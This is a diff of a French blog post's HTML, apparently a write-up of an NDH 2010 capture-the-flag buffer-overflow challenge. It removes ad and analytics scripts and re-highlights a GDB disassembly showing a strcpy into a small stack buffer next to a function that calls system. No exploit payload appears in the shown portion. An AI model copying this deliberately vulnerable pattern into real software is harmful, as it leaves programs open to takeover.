@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2010/07/23/simple-buffer-overflow-offset.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -197,7 +177,8 @@ C’est le premier challenge du SSH public NDH 2010.</p>
   <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
         <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Le code ASM correspondant :</p>
 
@@ -282,87 +263,88 @@ C’est le premier challenge du SSH public NDH 2010.</p>
 79
 80
 81
-</pre></td><td class="code"><pre><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">dummy</span><span class="o">:</span>
-   <span class="mh">0x08048504</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span> <span class="k">push</span>   <span class="err">%</span><span class="n">ebp</span>
-   <span class="mh">0x08048505</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">esp</span><span class="p">,</span><span class="err">%</span><span class="n">ebp</span>
-   <span class="mh">0x08048507</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span> <span class="k">push</span>   <span class="err">%</span><span class="n">esi</span>
-   <span class="mh">0x08048508</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span> <span class="k">push</span>   <span class="err">%</span><span class="n">ebx</span>
-   <span class="mh">0x08048509</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span> <span class="k">sub</span>    <span class="err">$</span><span class="mh">0xc</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>
-   <span class="mh">0x0804850c</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x8048438</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
-   <span class="mh">0x08048511</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="err">%</span><span class="n">esi</span>
-   <span class="mh">0x08048513</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x8048438</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
-   <span class="mh">0x08048518</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="err">%</span><span class="n">ebx</span>
-   <span class="mh">0x0804851a</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x8048438</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
-   <span class="mh">0x0804851f</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">esi</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x08048523</span> <span class="o">&lt;+</span><span class="mi">31</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">ebx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x08048527</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x0804852a</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x80483e8</span> <span class="o">&lt;</span><span class="n">setresuid</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
-   <span class="mh">0x0804852f</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;:</span> <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x80486c0</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x08048536</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x80483c8</span> <span class="o">&lt;</span><span class="n">system</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
-   <span class="mh">0x0804853b</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;:</span> <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x08048542</span> <span class="o">&lt;+</span><span class="mi">62</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x8048428</span> <span class="o">&lt;</span><span class="n">exit</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
-<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+</pre></td><td class="code"><pre><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">dummy</span><span class="p">:</span>
+   <span class="err">0</span><span class="nf">x08048504</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">push</span>   <span class="o">%</span><span class="nb">ebp</span>
+   <span class="err">0</span><span class="nf">x08048505</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>
+   <span class="err">0</span><span class="nf">x08048507</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">push</span>   <span class="o">%</span><span class="nb">esi</span>
+   <span class="err">0</span><span class="nf">x08048508</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">push</span>   <span class="o">%</span><span class="nb">ebx</span>
+   <span class="err">0</span><span class="nf">x08048509</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">sub</span>    <span class="kc">$</span><span class="mh">0xc</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
+   <span class="err">0</span><span class="nf">x0804850c</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x8048438</span> <span class="o">&lt;</span><span class="nv">geteuid@plt</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x08048511</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">esi</span>
+   <span class="err">0</span><span class="nf">x08048513</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x8048438</span> <span class="o">&lt;</span><span class="nv">geteuid@plt</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x08048518</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>
+   <span class="err">0</span><span class="nf">x0804851a</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x8048438</span> <span class="o">&lt;</span><span class="nv">geteuid@plt</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x0804851f</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x08048523</span> <span class="o">&lt;+</span><span class="mi">31</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">ebx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x08048527</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x0804852a</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x80483e8</span> <span class="o">&lt;</span><span class="nv">setresuid@plt</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x0804852f</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0x80486c0</span><span class="p">,(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x08048536</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x80483c8</span> <span class="o">&lt;</span><span class="nv">system@plt</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x0804853b</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0x0</span><span class="p">,(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x08048542</span> <span class="o">&lt;+</span><span class="mi">62</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x8048428</span> <span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">&gt;</span>
+<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
 
-<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">func</span><span class="o">:</span>
-   <span class="mh">0x08048547</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span> <span class="k">push</span>   <span class="err">%</span><span class="n">ebp</span>
-   <span class="mh">0x08048548</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">esp</span><span class="p">,</span><span class="err">%</span><span class="n">ebp</span>
-   <span class="mh">0x0804854a</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span> <span class="k">sub</span>    <span class="err">$</span><span class="mh">0x1c</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>
-   <span class="mh">0x0804854d</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span> <span class="k">lea</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>        <span class="c">; notre buffer est donc en %ebp-10</span>
-   <span class="mh">0x08048550</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span> <span class="k">add</span>    <span class="err">$</span><span class="mh">0x10</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x08048553</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x8049884</span>      <span class="c">; pointeur p</span>
-   <span class="mh">0x08048558</span> <span class="o">&lt;+</span><span class="mi">17</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">$</span><span class="mh">0x80486e2</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x0804855d</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;:</span> <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x8048504</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x08048565</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x08048568</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x8048408</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
-   <span class="mh">0x0804856d</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="mh">0x8049884</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x08048572</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;:</span> <span class="k">add</span>    <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x08048575</span> <span class="o">&lt;+</span><span class="mi">46</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="p">(</span><span class="err">%</span><span class="n">eax</span><span class="p">),</span><span class="err">%</span><span class="n">ecx</span>
-   <span class="mh">0x08048577</span> <span class="o">&lt;+</span><span class="mi">48</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="mh">0x8049884</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x0804857c</span> <span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="p">(</span><span class="err">%</span><span class="n">eax</span><span class="p">),</span><span class="err">%</span><span class="n">edx</span>
-   <span class="mh">0x0804857e</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">$</span><span class="mh">0x80486fc</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x08048583</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">ecx</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x08048587</span> <span class="o">&lt;+</span><span class="mi">64</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">edx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x0804858b</span> <span class="o">&lt;+</span><span class="mi">68</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x0804858e</span> <span class="o">&lt;+</span><span class="mi">71</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x8048408</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
-   <span class="mh">0x08048593</span> <span class="o">&lt;+</span><span class="mi">76</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x08048596</span> <span class="o">&lt;+</span><span class="mi">79</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x0804859a</span> <span class="o">&lt;+</span><span class="mi">83</span><span class="o">&gt;:</span> <span class="k">lea</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x0804859d</span> <span class="o">&lt;+</span><span class="mi">86</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x080485a0</span> <span class="o">&lt;+</span><span class="mi">89</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x80483f8</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
-   <span class="mh">0x080485a5</span> <span class="o">&lt;+</span><span class="mi">94</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="mh">0x8049884</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x080485aa</span> <span class="o">&lt;+</span><span class="mi">99</span><span class="o">&gt;:</span> <span class="k">add</span>    <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x080485ad</span> <span class="o">&lt;+</span><span class="mi">102</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="p">(</span><span class="err">%</span><span class="n">eax</span><span class="p">),</span><span class="err">%</span><span class="n">ecx</span>
-   <span class="mh">0x080485af</span> <span class="o">&lt;+</span><span class="mi">104</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="mh">0x8049884</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x080485b4</span> <span class="o">&lt;+</span><span class="mi">109</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="p">(</span><span class="err">%</span><span class="n">eax</span><span class="p">),</span><span class="err">%</span><span class="n">edx</span>
-   <span class="mh">0x080485b6</span> <span class="o">&lt;+</span><span class="mi">111</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">$</span><span class="mh">0x8048720</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
-   <span class="mh">0x080485bb</span> <span class="o">&lt;+</span><span class="mi">116</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">ecx</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x080485bf</span> <span class="o">&lt;+</span><span class="mi">120</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">edx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x080485c3</span> <span class="o">&lt;+</span><span class="mi">124</span><span class="o">&gt;:</span> <span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
-   <span class="mh">0x080485c6</span> <span class="o">&lt;+</span><span class="mi">127</span><span class="o">&gt;:</span> <span class="k">call</span>   <span class="mh">0x8048408</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
-   <span class="mh">0x080485cb</span> <span class="o">&lt;+</span><span class="mi">132</span><span class="o">&gt;:</span> <span class="k">leave</span>  
-   <span class="mh">0x080485cc</span> <span class="o">&lt;+</span><span class="mi">133</span><span class="o">&gt;:</span> <span class="k">ret</span>    
-<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+<span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">func</span><span class="p">:</span>
+   <span class="err">0</span><span class="nf">x08048547</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">push</span>   <span class="o">%</span><span class="nb">ebp</span>
+   <span class="err">0</span><span class="nf">x08048548</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>
+   <span class="err">0</span><span class="nf">x0804854a</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">sub</span>    <span class="kc">$</span><span class="mh">0x1c</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
+   <span class="err">0</span><span class="nf">x0804854d</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>        <span class="c1">; notre buffer est donc en %ebp-10</span>
+   <span class="err">0</span><span class="nf">x08048550</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">add</span>    <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x08048553</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mh">0x8049884</span>      <span class="c1">; pointeur p</span>
+   <span class="err">0</span><span class="nf">x08048558</span> <span class="o">&lt;+</span><span class="mi">17</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x80486e2</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x0804855d</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0x8048504</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x08048565</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x08048568</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x8048408</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x0804856d</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="mh">0x8049884</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x08048572</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">add</span>    <span class="kc">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x08048575</span> <span class="o">&lt;+</span><span class="mi">46</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="p">(</span><span class="o">%</span><span class="nb">eax</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>
+   <span class="err">0</span><span class="nf">x08048577</span> <span class="o">&lt;+</span><span class="mi">48</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="mh">0x8049884</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x0804857c</span> <span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="p">(</span><span class="o">%</span><span class="nb">eax</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>
+   <span class="err">0</span><span class="nf">x0804857e</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x80486fc</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x08048583</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">ecx</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x08048587</span> <span class="o">&lt;+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">edx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x0804858b</span> <span class="o">&lt;+</span><span class="mi">68</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x0804858e</span> <span class="o">&lt;+</span><span class="mi">71</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x8048408</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x08048593</span> <span class="o">&lt;+</span><span class="mi">76</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x08048596</span> <span class="o">&lt;+</span><span class="mi">79</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x0804859a</span> <span class="o">&lt;+</span><span class="mi">83</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x0804859d</span> <span class="o">&lt;+</span><span class="mi">86</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+   <span class="err">0</span><span class="nf">x080485a0</span> <span class="o">&lt;+</span><span class="mi">89</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">call</span>   <span class="mh">0x80483f8</span> <span class="o">&lt;</span><span class="nv">strcpy@plt</span><span class="o">&gt;</span>
+   <span class="err">0</span><span class="nf">x080485a5</span> <span class="o">&lt;+</span><span class="mi">94</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="mh">0x8049884</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x080485aa</span> <span class="o">&lt;+</span><span class="mi">99</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">add</span>    <span class="kc">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x080485ad</span> <span class="o">&lt;+</span><span class="mi">102</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="p">(</span><span class="o">%</span><span class="nb">eax</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>
+   <span class="err">0</span><span class="nf">x080485af</span> <span class="o">&lt;+</span><span class="mi">104</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="mh">0x8049884</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+   <span class="err">0</span><span class="nf">x080485b4</span> <span class="o">&lt;+</span><span class="mi">109</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">mov</span>    <span class="p">(</span><span class="o">%</span><span class="nb">eax</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>
